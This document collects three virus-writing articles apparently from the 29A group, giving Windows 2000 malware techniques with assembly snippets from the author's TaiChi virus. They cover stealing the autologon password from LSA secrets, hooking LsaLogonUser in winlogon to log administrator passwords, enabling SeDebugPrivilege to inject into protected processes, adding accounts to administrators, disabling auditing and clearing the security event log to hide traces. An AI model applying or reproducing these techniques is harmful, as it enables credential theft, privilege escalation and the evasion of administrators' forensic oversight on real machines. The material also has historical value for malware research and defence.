			      .Gaining passwords.
				.by Ratter/29A.


.Intro.
If you read my article about impersonation you've probably noticed that for
have it working you need the account name and the password. It ain't a big
problem to retrieve the account name. The problem is to gain the password of
course. Here I'll present some ideas how to steal the passwords ...


.The easier one.
Maybe you're lazy as me and don't want to login everytime you turn on your
machine. Thatswhy you have the option to let the system log the default user
which you have set. For the lazy people like me the best solution :) However
where is stored the default user's password?

Of course in the SAM. However if you have the admin privileges it's very easy
to gain it from there. Have a look at code snippet again :)

- Retrieving DefaultPassword -
;-----------------------------------------------------------------------------
; Lsa* apis are exported by advapi32.dll

key_name	dw	name_length
		dw	name_length
		dd	offset _name_
_name_		dw	"D", "e", "f", "a", "u", "l", "t", "P", "a", "s", \
			"s", "w", "o", "r", "d"
name_length	equ	$-_name_


        @pushvar <policy_handle	dd	?>
	push 1
	call $+5+6*4
		dd	6*4
		dd	5 dup(?)
	push 0
	calle LsaOpenPolicy
        
        @pushvar <private_data	dd	?>
        push offset key_name
	push dword ptr [policy_handle]
	calle LsaRetrievePrivateData

        mov eax, dword ptr [private_data]	; now in eax ptr to an UNICODE string
	xchg eax, ecx
	jecxz next
						; which contains the DefaultPassword
	push eax
	mov eax, dword ptr [eax+4]		; now in eax the *DefaultPassword

	push eax
	calle LsaFreeMemory
	calle LsaFreeMemory

	push dword ptr [policy_handle]
	calle LsaClose
;-----------------------------------------------------------------------------

This was easy right? However it can be used in very limited cases. Let's have
a look at the second method.


.The Trojan method.
While coding TaiChi I've learned a lot of things about Win2k. First of all it
of course were the NTFS structures and the NTFS organization in whole. Secondly
it was a lot of things about security and also about the logon process ...

If you see that naughty dialog box while login to the system you've probably
also thought about "hey this can't be hard to hook and log all those passwords!".
And you we're right. It really ain't hard. All you need is some info about
how the logon process works and to know what to hook/patch ...

Winlogon is the component which handles the logon (the name gives a lil clue
right? :)). Since we have learned how to modify/patch winlogon we know a way
how to implant our hook code there. But what to hook?

Winlogon relies on Graphical Identification and Authentication (GINA) dll
which is responsible for retrieving user name and password. The default GINA
is Msgina.dll which brings us that naughty dialog box :). So msgina is the 
to start. I've coded a little winlogon replacement (well it's more a wrapper)
which you can find in binaries dir. This helped me to track what's happening
with the retrieved password and user name (the first place to hook could be
msgina.dll - the place where it retrieves the password from the dialog box;
however this is not the best place because user could write it badly and we
wouldn't know it ...). I realised that msgina (after encrypting it via 
RtlRunEncodeUnicodeString) sends user and password to the LsaLogonUser api
(which is in fact just a wrapper which via LPC communicates with lsass.exe
process) which is exported by secur32.dll. This is the right place to hook
because we have even the NTSTATUS on return so we know whether it was good
or badly writen - ie whether the user was logged in or not.

And this is exactly what I did. I hooked the LsaLogonUser api at the end (to
know the exit status) and all admin password I've logged to registry. I think
it's time for a code snippet from TaiChi :) I won't teach you how to hook a
function because you all know it of course. I'll just show you the hook
routine ...

.Closing.
There are some other ways to retrieve passwords. You don't have to infect
winlogon of course :) As i said the LsaLogonUser is just a wrapper to
lsass.exe process. So the next step is to infect lsass.exe process. Since
it is the main security handling process of the system possibilities are
obvious. And everytime you can try to crack the passwords in the SAM databases
using brute force of course :)) This I'll let upon you ...

			     .Infecting Winlogon.
				.by Ratter/29A.

.Intro.
You've probably tried to open winlogon process via OpenProcess api with desired
access to write. And you've probably failed :) Why? Winlogon is one of the
main Win32 subsystem components and thus is protected from other user-mode
processes to modify him. As other components runs with the system privileges
and thatswhy he's very interesting for us.

Imagine a situation:
Your virus is runned under normal user security context, but yet you're allowed
to modify winlogon. What does it mean for you (except that you can turn off
the sfp and install a password trojan :))? Everything runned in the winlogon
process (ie also your remote thread) is runned under the system privileges
which are equal to administrators ones. So put everything admin-neede in your
virus to a remote thread in winlogon and you'll win :)

So the key question is. How to make the system to let you modify winlogon and
other win32 subsystems? Afaik there are two user-mode ways to achieve it.

.Gflags technique.
Win2k has a set of systemwide global flags that can allow various internal
debugging, tracing and other functionality. In the kernel there is a variable
called NtGlobalFlag which is initialized every boot from the registry key
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\GlobalFlag. If you
have NTDDK go to the bin directory and run gflags.exe. This program changes
this key to achieve the functionality ...

There also exist two flags which affect debugging (ie writing :)) to the Win32
subsystem/winlogon. These two are "Debug Win32 subsystem" and
"Debug Win32 subsystem". If you want to enable them or the GlobalFlag key
with the 420000h value. You of course need to restart the system to have it
working. That's all ...

This tech was used the famous GetAdmin tool. This progie used the kernel mode bug
in AddAtom function to modify the NtGlobalFlag variable to let modify winlogon.
Then it runned the remote thread under the context of winlogon and added current
user to the administrator group. It really worked however the bug is fixed under
Win2k/XP.

.The SeDebugPrivilege approach.
This approach worx with the SeDebugPrivilege privilege. This has to be assigned
to account in which context you're running under. Defaultly this privilege have
only members of administrator group. Thus once runned as admin add this privilege
to Everyone group and the first step will be done.

When this has been done, we can go further. Now we have to enable this privilege
because defaultly it is disabled. This sample code from my Win2k.TaiChi shows
you how to do it ...

- Enabling SeDebugPrivilege -

	push eax
	call dword ptr [ebx+tOpenProcessToken]
	dec eax
	jnz touch_privilege_end

	lea edx, [token_privilegez.TP_luid]
	push edx
	push esi
	push eax
	call dword ptr [ebx+tLookupPrivilegeValueA]
	dec eax
	jnz touch_privilege_close_p_token

	push eax
	push eax
	push type(TOKEN_PRIVILEGES)
	lea edx, [token_privilegez]

	push 1
	pop dword ptr [edx]
	mov dword ptr [edx.TP_attribz], edi

	push edx
	push eax
	push dword ptr [process_token]
	call dword ptr [ebx+tAdjustTokenPrivileges]

touch_privilege_close_p_token:
	push eax
	push dword ptr [process_token]
	call dword ptr [ebx+tCloseHandle]
	pop eax
touch_privilege_end:
	@SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
	leave
	retn
touch_privilege_	endp
;-----------------------------------------------------------------------------

The snippet above simply "adjusts" your privileges and from now you're finally
allowed to modify what you want :)


.Debugger users.
Simply add the accoung to Debugger users group :) This should work too, however
i haven't tested it so I'm not 100% sure. Test it if you want and lemme know :)


.Closing.
Don't forget that not only winlogon could be the victim. Exampli gratia the 
lsass.exe the main security component of the whole system (even kernel mode
security functions work via LPC with this process) could be also modified.
Just reverse engineer and exploit what you'll find ...

	      .Opening NT boxes for you and your comrades in arms.
				.by Ratter/29A.

.Intro.
You have infected a NT box and you're runned under the administrators group
member security context. Now you can do everything you want with the machine.
How to make the machine open for you even if you log in as a normal user?


.Adding to administrators group.
Of course you can add now every account to administrators group. It's probably
the easiest way to achieve the full control of the machine everytime your virus
is runned. However this is not very "stealth" because even the stupidiest admin
worx with accounts and almost for sure will see it.

- Adding account to an administrators group -
;-----------------------------------------------------------------------------
; Apis are exported by advapi32.dll and netapi32.dll

	domain_name_buffer		db	100 dup(?)
	sid_buffer			db	30 dup(?)

        @pushvar <dd	?>			; SID_type
	@pushvar <dd	100>			; domain_name_buffer size
	push offset domain_name_buffer		; domain_name
	@pushvar <dd	30>			; sid_buffer size
	push offset sid_buffer			; on output - sid
	@pushsz "account"			; account name
	push 0					; system name - null is local system
	calle LookupAccountNameA

	push 1                         		; one entry
	@pushvar <dd	offset sid_buffer>	; entry buffer
	push 0					; entry type ...
	call $+5+15*2				; group name
	dw	"a", "d", "m", "i", "n", "i", "s", "t", "r", "a", "t", "o", "r", "s", 0
	push 0					; local system
        calle NetLocalGroupAddMembers
;-----------------------------------------------------------------------------

.Adding needed privileges for Impersonation/Debug mode.
This approach is much more clever. I won't paste the code from TaiChi here
in this case bacause it's too extensive so have a look to the source of
Win2k.TaiChi function add_privilegez. What it does? First it gets the Everyone
group SID and then adds both needed privileges to this group. SeTcbPrivilege
for impersonation and SeDebugPrivilege for Win32 subsystem infection support.

You can of course combinate both. If you'll use impersonation to achieve full
control then don't forget to install a trojan or find another way to retrieve
passwords. However if you'll use only Debug support then possibly better idea
is to modify the Global Flags because it's a little bit more "stealth" :) Or
you can code a NT kernel mode driver which would via IOCTL on demand modify
NtGlobalFlag variable to let you infect the protected components.


.Disabling auditing.
If an admin is a good one has auditing on so those steps you did (adding
privileges) got audited. It is good to disable auditing (see the function
disable_auditing in TaiChi) so nothing gets logged ...


.Clearing the security event log.
This is the log where auditing messages are stored. After you disable them
it's good to clear this one. See code snippet:

- Clearing the security event log -
;-----------------------------------------------------------------------------
; Used apis are exported by advapi32.dll

        ...
        @pushsz "Security"
	pop esi
	call clear_event_log
	...

clear_event_log	proc	near
	pushad
	@SEH_SetupFrame <jmp clear_event_log_end>

        push esi
	push 0
	call dword ptr [ebp+tOpenEventLogA]
	test eax, eax
	jz clear_event_log_end
	xchg eax, ebx

	push 0
	push ebx
	call dword ptr [ebp+tClearEventLogA]

	push ebx
	call dword ptr [ebp+tCloseEventLog]
clear_event_log_end:
	@SEH_RemoveFrame
	popad
	retn
clear_event_log	endp
;-----------------------------------------------------------------------------

Although the message "Event log cleared" will appear, it will hide your previous
steps and for the admin it will be harder to trace you. And of course this
log can be cleared totally by using for example NTFS direct access.


.Closing.
If you make these steps the NT box is opened for everyone. Once logged in
you can do what you want. Even if you don't plan to write NT viruses at least
add to your babes a code for adding SeDebugPrivilege to Everyone. Then it makes
for another viruses easier to infect the machine - remember your fellow coders
too :)))
